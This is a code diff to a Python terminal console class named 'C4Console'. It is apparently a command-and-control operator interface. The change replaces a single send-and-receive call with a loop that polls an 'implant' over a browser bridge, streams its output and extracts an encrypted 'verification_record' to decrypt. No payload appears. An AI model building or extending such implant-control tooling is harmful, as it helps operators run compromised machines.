@@ -1103,20 +1103,60 @@ class C4Console(App):
     @work(exclusive=False, group="browser-cmd")
     async def _send_via_browser(self, implant_id: str, encoded: str) -> None:
         try:
-            response = await browser_bridge.send_and_receive(implant_id, encoded)
-            slog(f"RESPONSE | implant={implant_id} len={len(response)}\n{response}")
+            # Send the message
+            await browser_bridge.send_message(implant_id, encoded)
             self._log("\n[bold cyan]Response:[/]")
-            # Truncate very long responses for the TUI
-            if len(response) > 2000:
-                self._log(response[:2000])
-                self._log(f"  [dim]... ({len(response)} chars total, truncated)[/]")
-            else:
-                self._log(response)
 
-            # Try to extract and decrypt verification_record from JSON response
-            self._try_decrypt_response(implant_id, response)
+            # Stream responses - poll and display as they come in
+            last_text = ""
+            record_pattern = re.compile(r'verification_record["\s:]+([A-Za-z0-9+/=]{50,})')
+            timeout = 120.0
+            elapsed = 0.0
+            poll_interval = 1.0
 
+            while elapsed < timeout:
+                await asyncio.sleep(poll_interval)
+                elapsed += poll_interval
+
+                try:
+                    result = await browser_bridge.poll_response(implant_id)
+                    current_text = result.get("data", "")
+                    is_processing = result.get("processing", False)
+                except Exception:
+                    continue
+
+                # Display new content
+                if current_text and current_text != last_text:
+                    # Show the new portion
+                    new_content = current_text[len(last_text):]
+                    if new_content.strip():
+                        self._log(f"[dim]{new_content.strip()}[/]")
+                    last_text = current_text
+
+                # Check if we found the verification_record
+                if record_pattern.search(current_text):
+                    # Give it one more poll to finalize
+                    await asyncio.sleep(0.5)
+                    try:
+                        final_result = await browser_bridge.poll_response(implant_id)
+                        final_text = final_result.get("data", current_text)
+                    except Exception:
+                        final_text = current_text
+
+                    slog(f"RESPONSE | implant={implant_id} len={len(final_text)}\n{final_text}")
+
+                    # Try to extract and decrypt verification_record
+                    self._try_decrypt_response(implant_id, final_text)
+                    self._log("")
+                    return
+
+            # Timeout
+            slog(f"TIMEOUT | implant={implant_id} len={len(last_text)}")
+            self._log(f"  [yellow]Response timeout after {timeout}s[/]")
+            if last_text:
+                self._try_decrypt_response(implant_id, last_text)
             self._log("")
+
         except Exception as e:
             slog(f"ERROR | implant={implant_id} browser_send_failed: {e}")
             self._log(f"  [red]Browser send failed:[/] {e}")
